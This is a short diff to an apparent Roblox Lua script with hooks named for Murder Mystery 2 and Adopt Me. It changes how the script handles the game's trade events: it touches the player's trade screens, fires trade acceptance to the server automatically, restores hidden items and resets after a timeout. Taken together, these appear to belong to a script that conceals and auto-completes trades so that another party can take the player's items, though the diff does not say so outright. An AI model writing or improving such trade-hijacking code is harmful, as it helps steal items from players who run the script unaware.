@@ -200,7 +200,7 @@ local function hook_mm2()
             shiftlockConn:Disconnect()
             shiftlockConn = nil
         end
-        UIS.MouseBehavior = Enum.MouseBehavior.Default
+        pcall(function() UIS.MouseBehavior = Enum.MouseBehavior.Default end)
         local gui = lp:FindFirstChild("PlayerGui")
         if not gui then return end
         for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
@@ -221,6 +221,7 @@ local function hook_mm2()
         readySent = false
         currentLastOffer = nil
         showGui()
+        restoreItems()
     end
 
     if updateTrade then
@@ -236,6 +237,12 @@ local function hook_mm2()
             if tradingWithAllowed then
                 resetState()
             end
+        end)
+    end
+
+    if completeTrade then
+        completeTrade.OnClientEvent:Connect(function()
+            resetState()
         end)
     end
 
@@ -303,16 +310,14 @@ local function hook_mm2()
                 local offer = currentLastOffer or tick()
                 pcall(function() acceptTrade:FireServer(TRADE_ID, offer) end)
             end
+
+            -- veiligheidsnet: als completeTrade nooit vuurt, reset na 15s
+            task.wait(15)
+            if tradingWithAllowed then
+                resetState()
+            end
         end)
     end)
-
-    if completeTrade then
-        completeTrade.OnClientEvent:Connect(function()
-            task.wait(0.5)
-            restoreItems()
-            resetState()
-        end)
-    end
 end
 
 local function hook_adoptme()
